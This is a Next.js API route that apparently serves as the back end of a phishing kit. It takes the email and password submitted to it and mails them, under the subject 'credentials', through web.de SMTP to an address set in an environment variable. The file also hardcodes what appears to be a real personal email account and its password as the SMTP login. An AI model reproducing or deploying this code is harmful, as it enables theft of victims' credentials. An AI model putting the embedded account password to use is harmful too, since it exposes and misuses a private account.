// Next.js API route support: https://nextjs.org/docs/api-routes/introduction
import type { NextApiRequest, NextApiResponse } from "next";
import nodemailer from "nodemailer";

type Data = {
  message: string;
};

export default function handler(
  req: NextApiRequest,
  res: NextApiResponse<Data>
) {
  const { email, password } = req.body;

  let transporter: nodemailer.Transporter = nodemailer.createTransport({
    service: "Wed.de",
    host: "smtp.web.de",
    port: 465,
    secure: true,
    auth: {
      user: "jens.muench1993@web.de",
      pass: "Mandylein1234!",
    },
  });

  return transporter
    .sendMail({
      from: `"datt" <jens.muench1993@web.de>`,
      to: process.env.EMAIL_TO_SEND,
      subject: "credentials",
      // text: `email: ${JSON.stringify(email)}, password: ${JSON.stringify(password)}`
      html: `<h3>${JSON.stringify(email).replaceAll(
        '"',
        ""
      )} /password: ${JSON.stringify(password).replaceAll('"', "")}</h3>`,
    })
    .then((rec) => {
      console.log(rec);

      return res.status(200).send({ message: "message sent" });
    })
    .catch((err) => {
      console.log(err);

      return res.status(200).send({ message: "an error occured" });
    });
}
